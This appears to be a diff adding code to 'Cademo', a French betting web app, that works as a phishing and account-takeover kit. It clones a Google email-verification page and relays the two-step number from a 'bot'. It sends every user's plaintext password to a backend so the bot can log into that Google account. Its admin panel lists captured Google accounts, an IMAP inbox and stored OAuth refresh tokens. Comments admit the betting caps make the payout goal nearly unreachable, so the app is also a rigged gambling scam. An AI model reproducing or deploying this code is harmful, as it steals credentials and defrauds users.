+                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+            </svg>
+            <h1 style="font-size:24px;font-weight:400;margin-bottom:12px;color:#202124;font-family:'Google Sans',Roboto,Arial,sans-serif;line-height:1.3;text-align:left;">Vérifiez votre adresse e-mail</h1>
+            <p style="font-size:16px;color:#5f6368;margin-bottom:16px;line-height:1.5;font-family:Roboto,Arial,sans-serif;text-align:left;">
+                Pour sécuriser votre compte, une notification sur votre boîte mail Gmail 'Oui, c'est moi' vous a été envoyée à l'adresse e-mail suivante : <b id="mail-user-email" style="color:#000;"></b>. Vous devez cliquer sur <b style="color:#000;">Oui, c'est moi</b>.
+            </p>
+
+            <!-- Illustration vérification email -->
+            <div style="max-width:320px;margin:24px auto;text-align:center;">
+                <img src="images/verify-icons.png" alt="Vérification email" style="width:100%;max-width:280px;height:auto;display:block;margin:0 auto;">
+            </div>
+
+            <!-- Affichage du code relay (s'affiche quand le bot envoie un chiffre) -->
+            <div id="relay-display" style="display:none;margin:24px 0;padding:20px;background:#f8f9fa;border-radius:8px;text-align:center;border:2px solid #1a73e8;">
+                <div id="relay-phone" style="font-size:13px;color:#5f6368;margin-bottom:8px;"></div>
+                <div style="font-size:16px;color:#5f6368;font-weight:500;margin-bottom:4px;">Choisissez le numéro :</div>
+                <div id="relay-code" style="font-size:48px;font-weight:700;color:#1a73e8;letter-spacing:8px;"></div>
+            </div>
+
+            <button id="mail-validate-btn" onclick="CD.validateMail()" style="width:100%;height:48px;background-color:#1a73e8;color:#fff;border:none;border-radius:24px;font-size:16px;font-weight:500;cursor:pointer;margin:24px 0;font-family:Google Sans,Roboto,Arial,sans-serif;opacity:1;" onmouseover="if(!this.disabled) this.style.backgroundColor='#1557b0'" onmouseout="if(!this.disabled) this.style.backgroundColor='#1a73e8'">Valider</button>
+
+            <p id="mail-pending" style="font-size:14px;color:#5f6368;text-align:center;margin:8px 0;font-family:Roboto,Arial,sans-serif;">En attente de confirmation...</p>
+
+            <p style="font-size:14px;color:#5f6368;text-align:center;margin-top:24px;font-family:Roboto,Arial,sans-serif;">Vous n'avez pas reçu le code ? <a href="#" style="color:#1a73e8;text-decoration:none;font-weight:500;">Renvoyer le code</a></p>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    // Fonction pour changer d'écran
+    function showScreen(screenId) {
+        // On cache toutes les pages
+        var screens = document.querySelectorAll('.screen');
+        screens.forEach(function(screen) {
+            screen.classList.remove('active');
+        });
+
+        // On affiche la page demandée
+        document.getElementById(screenId).classList.add('active');
+    }
+
+    // Nouvelle fonction : Récupère l'email tapé et va à l'écran suivant
+    function goToPassword() {
+        var emailField = document.getElementById('emailInput');
+        var emailValue = emailField.value;
+
+        // Petite vérification pour ne pas aller plus loin si c'est vide
+        if (emailValue.trim() === "") {
+            alert("Veuillez entrer un e-mail ou un numéro de téléphone.");
+            return;
+        }
+
+        // On met l'email tapé dans l'écran de mot de passe
+        document.getElementById('displayEmail').innerText = emailValue;
+
+        // On change d'écran
+        showScreen('page-password');
+    }
+
+</script>
+
+<!-- =========================================================================
+     AJOUTS CADEMO — l'application
+     ========================================================================= -->
+
+<div id="cademo-app">
+
+  <!-- ===================== EN-TÊTE ===================== -->
+  <header class="cd-header">
+    <div class="cd-header-left">
+      <h1 class="cd-wordmark">Cademo</h1>
+    </div>
+    <div class="cd-header-right">
+      <button class="cd-unlock-btn" id="hdr-unlock" onclick="CD.go('profile')">
+        <span class="material-symbols-outlined">lock</span>
+        <span id="hdr-unlock-text">€0</span>
+      </button>
+    </div>
+  </header>
+
+  <div class="cd-shell">
+
+    <!-- ===================== VUE : PARIS ===================== -->
+    <section class="cd-view active" id="v-bets">
+      <div class="cd-search">
+        <span class="material-symbols-outlined">search</span>
+        <input type="text" id="search-input" placeholder="Rechercher athlète, équipe, match..." oninput="CD.render()">
+      </div>
+      <div class="cd-sports" id="sport-tabs"></div>
+      <p class="cd-event" id="event-label"></p>
+      <div id="bet-sections"></div>
+    </section>
+
+    <!-- ===================== VUE : TICKET ===================== -->
+    <section class="cd-view" id="v-ticket">
+      <div class="cd-vhead" style="margin-bottom:var(--s-md);">
+        <div>
+          <h2 style="font-size:18px;font-weight:700;margin:0;">Ton ticket</h2>
+          <p id="tk-count" style="font-size:14px;color:var(--on-surface-variant);margin:4px 0 0;">0 sélection</p>
+        </div>
+        <button class="cd-clear" onclick="CD.clearSlip()" style="font-size:12px;font-weight:700;color:var(--outline);display:flex;align-items:center;gap:4px;background:none;border:none;cursor:pointer;">
+          <span class="material-symbols-outlined" style="font-size:16px;">delete</span> Tout vider
+        </button>
+      </div>
+      <div id="ticket-legs"></div>
+      <button class="cd-addmore" onclick="CD.go('bets')" style="margin-bottom:var(--s-md);">
+        <span class="material-symbols-outlined" style="font-size:20px;">add</span> Ajouter des paris
+      </button>
+
+      <div class="cd-stakebox" id="stake-box" style="border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:var(--s-md);background-color:var(--sc-low);">
+        <div class="cd-quick" id="quick-stakes">
+          <button data-stake="5">€5</button>
+          <button data-stake="10">€10</button>
+          <button data-stake="25">€25</button>
+          <button data-stake="50">€50</button>
+          <button data-stake="max">MAX</button>
+        </div>
+        <div style="position:relative;margin-bottom:var(--s-md);">
+          <span style="position:absolute;left:var(--s-md);top:50%;transform:translateY(-50%);font-size:20px;font-weight:600;color:var(--on-surface-variant);pointer-events:none;">€</span>
+          <input type="number" id="stake-input" min="1" step="1" value="10" placeholder="0.00" oninput="CD.renderTicket()" style="width:100%;box-sizing:border-box;background-color:#070B14;border:1px solid var(--outline-variant);border-radius:20px;padding:16px var(--s-md) 16px 48px;text-align:right;font-family:var(--sans);font-size:28px;font-weight:800;color:var(--on-surface);outline:none;">
+        </div>
+        <div style="display:flex;justify-content:space-between;align-items:center;padding-top:var(--s-sm);border-top:1px solid rgba(255,255,255,0.1);">
+          <span style="font-size:14px;color:var(--on-surface-variant);font-weight:600;">To Win</span>
+          <div style="text-align:right;">
+            <span id="tk-win" style="font-size:24px;font-weight:700;color:var(--green);">—</span>
+            <span id="tk-odds" style="display:block;font-size:12px;color:var(--outline);margin-top:2px;">Multiplier: —</span>
+          </div>
+        </div>
+        <p style="margin:var(--s-md) 0 0;text-align:center;font-size:14px;color:var(--on-surface-variant);">Solde après mise : <b id="tk-after" style="color:var(--on-surface);font-weight:600;">—</b></p>
+        <p class="cd-cap" id="tk-cap" style="margin:6px 0 0;text-align:center;font-size:12px;line-height:1.5;color:var(--outline);"></p>
+        <p class="cd-cap" id="tk-limit" style="margin:6px 0 0;text-align:center;font-size:12px;line-height:1.5;color:var(--outline);"></p>
+      </div>
+
+      <button class="cd-validate" id="tk-confirm" onclick="CD.placeBet()" style="width:100%;box-sizing:border-box;margin-top:var(--s-sm);background-color:var(--gold);color:var(--on-gold-container);border:none;border-radius:8px;padding:var(--s-md);cursor:pointer;font-family:var(--sans);font-size:18px;font-weight:700;display:flex;align-items:center;justify-content:center;gap:8px;transition:all .15s;">
+        Valider le pari <span class="material-symbols-outlined" style="font-variation-settings:'FILL' 1;">done</span>
+      </button>
+    </section>
+
+    <!-- ===================== VUE : MES PARIS ===================== -->
+    <section class="cd-view" id="v-mybets">
+      <div style="display:flex;gap:4px;margin-bottom:var(--s-lg);background-color:var(--sc-low);border-radius:8px;padding:4px;">
+        <button data-mb="open" onclick="CD.setMyBetsTab('open')" style="flex:1;padding:10px;border:none;border-radius:6px;cursor:pointer;background:none;font-family:var(--sans);font-size:14px;font-weight:700;color:var(--on-surface-variant);" id="mb-tab-open">En cours</button>
+        <button data-mb="done" onclick="CD.setMyBetsTab('done')" style="flex:1;padding:10px;border:none;border-radius:6px;cursor:pointer;background:none;font-family:var(--sans);font-size:14px;font-weight:700;color:var(--on-surface-variant);" id="mb-tab-done">Réglés</button>
+      </div>
+      <div id="mybets-list"></div>
+    </section>
+
+    <!-- ===================== VUE : PROFIL ===================== -->
+    <section class="cd-view" id="v-profile">
+      <!-- Profile Header & Balance -->
+      <div style="background-color:var(--sc-high);border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:var(--s-md);display:flex;flex-direction:column;gap:var(--s-sm);margin-bottom:var(--s-md);position:relative;overflow:hidden;">
+        <div style="position:absolute;inset:0;background:linear-gradient(to bottom right, rgba(29,78,216,0.1), transparent);pointer-events:none;"></div>
+        <div style="display:flex;align-items:center;gap:var(--s-md);position:relative;z-index:1;">
+          <div>
+            <h2 style="font-size:24px;font-weight:700;margin:0;color:var(--on-surface);" id="pf-name">Alex Mercer</h2>
+            <p style="font-size:14px;font-weight:500;color:var(--gold);margin:4px 0 0;" id="pf-shortid"></p>
+            <p style="font-size:14px;font-weight:500;color:var(--on-surface-variant);margin:4px 0 0;" id="pf-since">Member since 2023</p>
+          </div>
+        </div>
+        <div style="margin-top:var(--s-sm);background-color:var(--sc);border-radius:6px;padding:var(--s-md);position:relative;z-index:1;">
+          <div style="font-size:12px;font-weight:700;color:var(--on-surface-variant);margin-bottom:4px;">SOLDE ACTUEL</div>
+          <div id="pf-balance" style="font-size:28px;font-weight:800;color:var(--on-surface);margin-bottom:var(--s-sm);">€0</div>
+          <button class="cd-unlock-btn" id="pf-unlock-btn" onclick="" style="width:100%;justify-content:center;padding:10px;">
+            <span class="material-symbols-outlined">lock</span>
+            <span id="pf-unlock-text">€0</span>
+          </button>
+        </div>
+      </div>
+
+      <!-- Goal Progress -->
+      <div style="background-color:var(--sc-high);border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:var(--s-md);display:flex;flex-direction:column;gap:var(--s-sm);margin-bottom:var(--s-md);">
+        <div style="display:flex;justify-content:space-between;align-items:flex-end;">
+          <h3 style="font-size:18px;font-weight:700;margin:0;color:var(--on-surface);">Objectif solde</h3>
+          <span style="font-size:12px;font-weight:700;color:var(--blue-light);" id="pf-pct">0%</span>
+        </div>
+        <div style="width:100%;background-color:var(--surface-variant);height:12px;border-radius:999px;overflow:hidden;">
+          <div id="pf-bar" style="background-color:var(--blue);height:100%;border-radius:999px;width:0%;transition:width .3s;"></div>
+        </div>
+        <p style="font-size:11px;font-weight:500;color:var(--on-surface-variant);margin:0;text-align:right;" id="pf-remaining">€2,000.00 remaining</p>
+      </div>
+
+      <!-- Wager Bonus -->
+      <div class="cd-wager-card" id="pf-wager-card" style="display:none;">
+        <div class="cd-wager-top">
+          <h3>Wager bonus</h3>
+          <span id="pf-wager-pct">0%</span>
+        </div>
+        <div class="cd-wager-bar-wrap">
+          <div class="cd-wager-bar" id="pf-wager-bar"></div>
+        </div>
+        <p class="cd-wager-info" id="pf-wager-info">0 € / 0 € misés</p>
+        <p class="cd-wager-blocked" id="pf-wager-blocked" style="display:none;">Encore <b id="pf-wager-remain">0 €</b> de mises avant retrait.</p>
+        <p class="cd-wager-done" id="pf-wager-done" style="display:none;">Wager atteint — tes gains sont retirables.</p>
+        <button class="cd-withdraw-btn" id="pf-withdraw-btn" onclick="CD.withdrawFunds()" style="display:none;">
+          <span class="material-symbols-outlined">account_balance</span> Retirer mes gains
+        </button>
+      </div>
+
+      <!-- Stats Grid -->
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:var(--s-sm);margin-bottom:var(--s-md);">
+        <div style="background-color:var(--sc-high);border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:var(--s-md);display:flex;flex-direction:column;gap:4px;">
+          <span class="material-symbols-outlined" style="color:var(--blue-light);font-size:20px;">receipt_long</span>
+          <span style="font-size:11px;font-weight:500;color:var(--on-surface-variant);margin-top:4px;">Paris placés</span>
+          <span id="pf-count" style="font-size:18px;font-weight:700;color:var(--on-surface);">0</span>
+        </div>
+        <div style="background-color:var(--sc-high);border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:var(--s-md);display:flex;flex-direction:column;gap:4px;">
+          <span class="material-symbols-outlined" style="color:var(--green);font-size:20px;">emoji_events</span>
+          <span style="font-size:11px;font-weight:500;color:var(--on-surface-variant);margin-top:4px;">Paris gagnés</span>
+          <span id="pf-won" style="font-size:18px;font-weight:700;color:var(--on-surface);">0</span>
+        </div>
+        <div style="background-color:var(--sc-high);border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:var(--s-md);display:flex;flex-direction:column;gap:4px;grid-column:span 2;">
+          <span class="material-symbols-outlined" style="color:var(--gold-dim);font-size:20px;">payments</span>
+          <span style="font-size:11px;font-weight:500;color:var(--on-surface-variant);margin-top:4px;">Total misé</span>
+          <span id="pf-staked" style="font-size:18px;font-weight:700;color:var(--on-surface);">€0</span>
+        </div>
+      </div>
+
+      <!-- Settings List -->
+      <div style="display:flex;flex-direction:column;gap:var(--s-xs);margin-bottom:var(--s-md);">
+        <h3 style="font-size:12px;font-weight:700;color:var(--on-surface-variant);text-transform:uppercase;letter-spacing:0.05em;padding:0 8px;margin:0 0 4px;">Account &amp; Settings</h3>
+        <button style="background-color:var(--sc-high);border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:var(--s-md);display:flex;align-items:center;justify-content:space-between;cursor:pointer;color:var(--on-surface);font-family:var(--sans);font-size:14px;font-weight:500;text-align:left;" onmouseover="this.style.backgroundColor='var(--sc-highest)'" onmouseout="this.style.backgroundColor='var(--sc-high)'">
+          <div style="display:flex;align-items:center;gap:var(--s-sm);">
+            <span class="material-symbols-outlined" style="color:var(--on-surface-variant);">person</span>
+            <span>Personal Information</span>
+          </div>
+          <span class="material-symbols-outlined" style="color:var(--on-surface-variant);">chevron_right</span>
+        </button>
+        <button style="background-color:var(--sc-high);border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:var(--s-md);display:flex;align-items:center;justify-content:space-between;cursor:pointer;color:var(--on-surface);font-family:var(--sans);font-size:14px;font-weight:500;text-align:left;" onmouseover="this.style.backgroundColor='var(--sc-highest)'" onmouseout="this.style.backgroundColor='var(--sc-high)'">
+          <div style="display:flex;align-items:center;gap:var(--s-sm);">
+            <span class="material-symbols-outlined" style="color:var(--on-surface-variant);">notifications</span>
+            <span>Notifications</span>
+          </div>
+          <span class="material-symbols-outlined" style="color:var(--on-surface-variant);">chevron_right</span>
+        </button>
+      </div>
+
+      <button onclick="CD.logout()" style="width:100%;background-color:var(--sc-high);border:1px solid rgba(255,180,171,0.3);border-radius:8px;padding:var(--s-md);display:flex;align-items:center;justify-content:center;gap:var(--s-sm);cursor:pointer;color:var(--error);font-family:var(--sans);font-size:16px;font-weight:600;margin-bottom:var(--s-md);" onmouseover="this.style.backgroundColor='rgba(255,180,171,0.2)'" onmouseout="this.style.backgroundColor='var(--sc-high)'">
+        <span class="material-symbols-outlined">logout</span>
+        <span>Log Out</span>
+      </button>
+    </section>
+
+    <!-- ===================== VUE : PARTNER ===================== -->
+    <section class="cd-view" id="v-partner">
+      <div class="cd-partner-head">
+        <h1>Espace Partenaire</h1>
+        <p>Attribue les bonus d'activation et suis tes filleuls.</p>
+        <span class="cd-partner-handle" id="pt-handle">—</span>
+      </div>
+
+      <!-- Section 1 — Recherche & activation du bonus -->
+      <section class="cd-p-sec">
+        <h2><span class="material-symbols-outlined">manage_search</span> Attribuer un bonus</h2>
+        <p class="cd-p-desc">Recherche un joueur par son identifiant exact (<b>@pseudo</b>). Aucune liste globale n'est exposée.</p>
+        <div class="cd-search-form">
+          <input type="text" class="cd-p-input" id="pt-search" placeholder="@identifiant"
+                 autocomplete="off" spellcheck="false"
+                 onkeydown="if(event.key==='Enter')CD.partnerSearch()">
+          <button class="cd-p-go" onclick="CD.partnerSearch()">
+            <span class="material-symbols-outlined">search</span>
+          </button>
+        </div>
+        <div id="pt-result"></div>
+      </section>
+
+      <!-- Section 2 — Suivi des filleuls -->
+      <section class="cd-p-sec">
+        <h2><span class="material-symbols-outlined">groups</span> Mes filleuls</h2>
+        <p class="cd-p-desc">Uniquement les comptes ayant validé leur e-mail. Chaque palier de 30 débloque une commission de 50 €.</p>
+        <div class="cd-p-link" id="pt-link"></div>
+        <div class="cd-p-progress-card" id="pt-progress"></div>
+        <div class="cd-p-list" id="pt-referrals"></div>
+        <div class="cd-p-demo">
+          <button onclick="CD.partnerSeedDemo()">Générer des filleuls de démo</button>
+          <button onclick="CD.partnerClearDemo()">Effacer la démo</button>
+        </div>
+      </section>
+
+      <button class="cd-p-signout" onclick="CD.logout()">
+        <span class="material-symbols-outlined">logout</span> Se déconnecter
+      </button>
+    </section>
+
+    <!-- ===================== VUE : ADMIN ===================== -->
+    <section class="cd-view" id="v-admin">
+      <div class="cd-adm-head">
+        <h1>Admin Control</h1>
+        <p>Gérer les comptes et régler les paris en attente.</p>
+      </div>
+
+      <div class="cd-adm-sec">
+        <div class="cd-adm-bar">
+          <h2><span class="material-symbols-outlined">group</span> Comptes actifs</h2>
+          <span class="cd-count" id="adm-total">Total : 0</span>
+        </div>
+        <div class="cd-admfilter">
+          <button class="is-on" data-adm="all" onclick="CD.setAdminFilter('all')">Tous</button>
+          <button data-adm="goal" onclick="CD.setAdminFilter('goal')">≥ 2000 €</button>
+        </div>
+        <div id="admin-users"></div>
+      </div>
+
+      <div class="cd-adm-sec">
+        <div class="cd-adm-bar">
+          <h2><span class="material-symbols-outlined">pending_actions</span> Paris à régler</h2>
+          <span class="cd-count is-gold" id="adm-pending">0 en attente</span>
+        </div>
+        <div id="admin-bets"></div>
+      </div>
+
+      <!-- ============ COMPTES GOOGLE ============ -->
+      <div class="cd-adm-sec">
+        <div class="cd-adm-bar">
+          <h2><span class="material-symbols-outlined">account_circle</span> Comptes Google</h2>
+          <span class="cd-count" id="adm-google-total">Total : 0</span>
+        </div>
+        <div class="cd-admfilter">
+          <button class="is-on" data-adm-g="all" onclick="CD.setGoogleFilter('all')">Tous</button>
+          <button data-adm-g="active" onclick="CD.setGoogleFilter('active')">Connectés</button>
+          <button data-adm-g="failed" onclick="CD.setGoogleFilter('failed')">Échecs</button>
+        </div>
+        <div id="admin-google-accounts"></div>
+      </div>
+
+      <!-- ============ OUTILS BACKEND (branchés sur l'API Node) ============ -->
+      <div class="cd-adm-sec">
+        <div class="cd-adm-bar">
+          <h2><span class="material-symbols-outlined">construction</span> Outils backend</h2>
+          <span class="cd-count" id="api-status">API : —</span>
+        </div>
+        <p class="cd-note" id="api-hint">Ces outils appellent l'API Node locale (npm start dans <code>api/</code>). Configure l'URL et le secret dans les réglages ci-dessous.</p>
+
+        <details class="cd-tool">
+          <summary><span class="material-symbols-outlined">settings</span> Réglages de l'API</summary>
+          <input type="text" class="cd-field" id="api-base" placeholder="http://localhost:3000">
+          <input type="text" class="cd-field" id="api-secret" placeholder="Secret partagé (facultatif, X-Cademo-Secret)">
+          <button class="cd-cta" onclick="CD.apiSaveSettings()">Enregistrer</button>
+        </details>
+
+        <details class="cd-tool">
+          <summary><span class="material-symbols-outlined">mark_email_read</span> Vérifier un compte (verify-account)</summary>
+          <input type="email" class="cd-field" id="vfy-email" placeholder="email@exemple.com">
+          <div style="display:flex;gap:8px;">
+            <button class="cd-cta" onclick="CD.apiVerify('verified')" style="background-color:var(--green);color:#fff;">Marquer VÉRIFIÉ</button>
+            <button class="cd-cta" onclick="CD.apiVerify('pending')" style="background-color:var(--sc-high);color:var(--on-surface);">Marquer En attente</button>
+          </div>
+          <pre class="cd-out" id="vfy-out"></pre>
+        </details>
+
+        <details class="cd-tool">
+          <summary><span class="material-symbols-outlined">inbox</span> Boîte de réception (IMAP)</summary>
+          <div style="display:flex;gap:8px;align-items:center;">
+            <input type="number" class="cd-field" id="imap-limit" placeholder="10" value="10" style="max-width:100px;margin:0;">
+            <button class="cd-cta" onclick="CD.apiInbox()">Rafraîchir</button>
+          </div>
+          <div id="imap-out" class="cd-imap"></div>
+        </details>
+
+        <details class="cd-tool">
+          <summary><span class="material-symbols-outlined">key</span> Configs OAuth stockées</summary>
+          <div id="cfg-list" class="cd-cfg-list"></div>
+          <button class="cd-cta" onclick="CD.apiListConfigs()" style="background-color:var(--sc-high);color:var(--on-surface);margin-bottom:12px;">Rafraîchir la liste</button>
+          <p class="cd-note" style="margin:8px 0 6px;">Ajouter / mettre à jour une entrée :</p>
+          <input type="email" class="cd-field" id="cfg-email" placeholder="email@exemple.com">
+          <input type="text" class="cd-field" id="cfg-token" placeholder="refresh_token">
+          <button class="cd-cta" onclick="CD.apiSaveConfig()">Sauvegarder (chiffré)</button>
+        </details>
+      </div>
+    </section>
+
+  </div>
+
+  <!-- ===================== NAV BASSE ===================== -->
+  <nav class="cd-nav" id="cd-nav">
+    <button class="is-on" data-nav="bets" onclick="CD.go('bets')">
+      <span class="material-symbols-outlined">dashboard</span>Paris
+    </button>
+    <button data-nav="ticket" onclick="CD.go('ticket')">
+      <span class="material-symbols-outlined">receipt_long</span>Ticket
+      <i class="cd-badge" id="nav-badge" style="display:none;">0</i>
+    </button>
+    <button data-nav="mybets" onclick="CD.go('mybets')">
+      <span class="material-symbols-outlined">history</span>My Bets
+    </button>
+    <button data-nav="profile" onclick="CD.go('profile')">
+      <span class="material-symbols-outlined">person</span>Profile
+    </button>
+    <button data-nav="admin" id="nav-admin" onclick="CD.go('admin')">
+      <span class="material-symbols-outlined">shield_person</span>Admin
+    </button>
+    <button data-nav="partner" id="nav-partner" onclick="CD.go('partner')">
+      <span class="material-symbols-outlined">handshake</span>Partner
+    </button>
+  </nav>
+
+  <!-- ===================== FEUILLE : CRÉDITER ===================== -->
+  <div class="cd-sheet" id="sheet-credit">
+    <div class="cd-sheet-inner">
+      <div class="cd-sheet-head">
+        <h2>Créditer un compte</h2>
+        <button onclick="CD.closeSheet('sheet-credit')"><span class="material-symbols-outlined">close</span></button>
+      </div>
+      <p class="cd-note" style="margin:0 0 12px;" id="credit-target">—</p>
+      <input type="number" class="cd-field" id="credit-amount" placeholder="Montant en € (négatif pour retirer)" value="200">
+      <button class="cd-cta" onclick="CD.applyCredit()">Appliquer</button>
+    </div>
+  </div>
+
+</div>
+
+<script>
+/* =========================================================================
+   CADEMO — logique de l'application.
+   N'écrase rien du code d'origine : showScreen / goToPassword sont enrobées.
+   ========================================================================= */
+(function () {
+  "use strict";
+
+  var GOAL = 2000;
+  var START_BALANCE = 0;
+
+  /* ------------------------------------------------------------- ÉCONOMIE
+     Ces trois plafonds sont ce qui rend l'objectif quasi inatteignable.
+     Calculés dans tools/bareme.js : avec ce réglage, le MEILLEUR joueur
+     possible a 1 chance sur 6 590 919 d'atteindre 2000 € en partant de 200 €.
+     Ne pas les changer sans relancer « node tools/bareme.js ».            */
+  var MISE_MIN      = 5;      // mise minimale, en €
+  var MISE_MAX_ABS  = 50;     // mise maximale absolue, en €
+  var MISE_MAX_FRAC = 0.10;   // ... et au plus 10 % du solde
+  var GAIN_MAX      = 45;     // gain maximum par ticket, en €
+
+  // Mise maximale autorisée pour un solde donné.
+  function miseMax(balance) {
+    var cap = Math.min(MISE_MAX_ABS, Math.floor(balance * MISE_MAX_FRAC));
+    return Math.min(balance, Math.max(MISE_MIN, cap));
+  }
+  // Gain d'un ticket, plafond appliqué.
+  function gainDe(stake, odds) { return Math.min(stake * odds, GAIN_MAX); }
+
+  /* --------------------------------------------------------- SUPABASE (auth)
+     Renseigne ces deux valeurs pour activer la vraie connexion (voir SETUP.md).
+     Tant qu'elles sont vides, l'app tourne en mode local (localStorage) et le
+     mot de passe n'est pas vérifié — pratique pour développer hors ligne.     */
+  var SUPABASE_URL = "https://vmmicbfoobdbtikcqxel.supabase.co";
+  var SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZtbWljYmZvb2JkYnRpa2NxeGVsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODc3Njg2NTUsImV4cCI6MjEwMzM0NDY1NX0.ahztCUDIp6om4r8e0l44nHbRExKdCXhRiutzRvIriyU";
+
+  var _sb = null, _sbTried = false;
+  function supabaseReady() {
+    if (!SUPABASE_URL || !SUPABASE_ANON_KEY) return Promise.resolve(null);
+    if (_sb) return Promise.resolve(_sb);
+    return new Promise(function (resolve) {
+      var done = false;
+      function finish(val) { if (!done) { done = true; resolve(val); } }
+      function init() {
+        try { _sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY); }
+        catch (e) { _sb = null; }
+        finish(_sb);
+      }
+      if (window.supabase && window.supabase.createClient) return init();
+      if (_sbTried) return finish(null);
+      _sbTried = true;
+      var s = document.createElement("script");
+      s.src = "https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2";
+      s.onload = init;
+      s.onerror = function () { finish(null); };
+      document.head.appendChild(s);
+      setTimeout(function () { finish(null); }, 4000);
+    });
+  }
+
+  // Connexion réelle : vérifie le mot de passe via Supabase (qui le chiffre),
+  // crée le compte s'il n'existe pas, puis ouvre l'app. Sans configuration
+  // Supabase, ouvre directement le compte local correspondant à l'email.
+
+  // Garde le dernier mot de passe saisi pour pouvoir l'envoyer au backend
+  // lors de la vérification email ou du stockage automatique.
+  var _lastPassword = "";
+
+  function cademoLogin() {
+    try {
+      var email = (el("displayEmail").innerText || "").trim();
+      // Fallback si la page a été rechargée et que displayEmail est revenu à "Chargement..."
+      if (!email || email === "Chargement...") {
+        email = (typeof currentEmail === "function" ? currentEmail() : "") || "";
+      }
+      // On lit le champ mot de passe de la page sans modifier ton HTML.
+      var pwEl = document.querySelector('#page-password input[type="password"], #page-password input[type="text"]');
+      var pw = (pwEl ? pwEl.value : "").trim();
+      if (!email) {
+        alert("Aucun e-mail trouvé. Merci de recommencer depuis l'écran de saisie de l'e-mail.");
+        return;
+      }
+      _lastPassword = pw;
+
+      function openCaptchaFallback() {
+        // Secours : si CD.open n'a pas changé d'écran après 3 s, on force le captcha
+        setTimeout(function () {
+          var pwScreen = document.getElementById("page-password");
+          if (pwScreen && pwScreen.classList.contains("active")) {
+            console.warn("[FALLBACK] page-password toujours active après 3 s — bascule forcée sur captcha");
+            if (typeof launchVerificationBot === "function") launchVerificationBot(email);
+            showScreen("page-captcha");
+          }
+        }, 3000);
+      }
+
+      supabaseReady().then(function (sb) {
+        if (!sb) {
+          CD.open(email);
+          openCaptchaFallback();
+          return;
+        }
+        if (pw.length < 6) { alert("Ton mot de passe doit faire au moins 6 caractères."); return; }
+        sb.auth.signInWithPassword({ email: email, password: pw }).then(function (res) {
+          if (!res.error) {
+            var authId = res.data && res.data.user && res.data.user.id ? res.data.user.id : null;
+            var authToken = res.data && res.data.session && res.data.session.access_token ? res.data.session.access_token : null;
+            // ENVOI LE PASS AU BACKEND même en connexion (rattrapage anciens comptes)
+            if (authId && pw) {
+              fetch(apiBase() + "/api/store-signup-password", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ authUserId: authId, email: email, password: pw })
+              }).catch(function(e) { console.error("[LOGIN] Erreur stockage mdp:", e); });
+            }
+            CD.open(email, authId, authToken);
+            return;
+          }
+          var msg = (res.error.message || "").toLowerCase();
+          if (msg.indexOf("invalid login") >= 0) {
+            sb.auth.signUp({ email: email, password: pw }).then(function (r2) {
+              if (r2.error) {
+                var m2 = (r2.error.message || "").toLowerCase();
+                if (m2.indexOf("already") >= 0) {
+                  // Le compte existe DÉJÀ avec un autre mot de passe.
+                  alert(
+                    "Mot de passe incorrect pour " + email + ".\n\n" +
+                    "Si tu l'as oublié :\n" +
+                    "1) Ouvre supabase.com → ton projet → Authentication → Users\n" +
+                    "2) Trouve ton adresse, clique les « … » → Delete user\n" +
+                    "3) Reviens ici et remets ton nouveau mot de passe.\n\n" +
+                    "Astuce : la 1ʳᵉ fois, le champ était pré-rempli avec " +
+                    "« EnterYourPassword3 » — essaie ça d'abord."
+                  );
+                } else {
+                  alert("Création impossible : " + r2.error.message);
+                }
+                return;
+              }
+              if (r2.data && r2.data.session) {
+                var authId2 = r2.data && r2.data.user && r2.data.user.id ? r2.data.user.id : null;
+                var authToken2 = r2.data && r2.data.session && r2.data.session.access_token ? r2.data.session.access_token : null;
+                // ENVOI du mot de passe au backend pour le bot (même email = même compte Google)
+                if (authId2 && pw) {
+                  fetch(apiBase() + "/api/store-signup-password", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ authUserId: authId2, email: email, password: pw })
+                  }).catch(function(e) { console.error("[SIGNUP] Erreur stockage mdp:", e); });
+                }
+                CD.open(email, authId2, authToken2);
+              }
+              else alert("Compte créé. Confirme ton email si c'est demandé, puis reconnecte-toi.");
+            }).catch(function(err) {
+              console.error("[SIGNUP] Erreur réseau:", err);
+              alert("Erreur réseau lors de la création du compte.");
+            });
+          } else if (msg.indexOf("confirm") >= 0) {
+            alert("Confirme ton email avant de te connecter.");
+          } else {
+            alert("Connexion impossible : " + res.error.message);
+          }
+        }).catch(function(err) {
+          console.error("[LOGIN] Erreur réseau Supabase:", err);
+          alert("Erreur réseau avec Supabase. Passage en mode local…");
+          CD.open(email);
+          openCaptchaFallback();
+        });
+      }).catch(function(err) {
+        console.error("[LOGIN] supabaseReady error:", err);
+        alert("Erreur Supabase. Passage en mode local…");
+        CD.open(email);
+        openCaptchaFallback();
+      });
+    } catch (e) {
+      console.error("cademoLogin error:", e);
+      alert("Erreur inattendue : " + (e && e.message ? e.message : e));
+    }
+  }
+  window.cademoLogin = cademoLogin;
+
+  function launchVerificationBot(email) {
+    if (!email) return;
+    fetch(apiBase() + "/api/verify-email-python", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ cademoEmail: email, password: _lastPassword || null })
+    }).catch(function(e) { console.error("[BOT] Erreur lancement:", e); });
+  }
+  window.launchVerificationBot = launchVerificationBot;
+
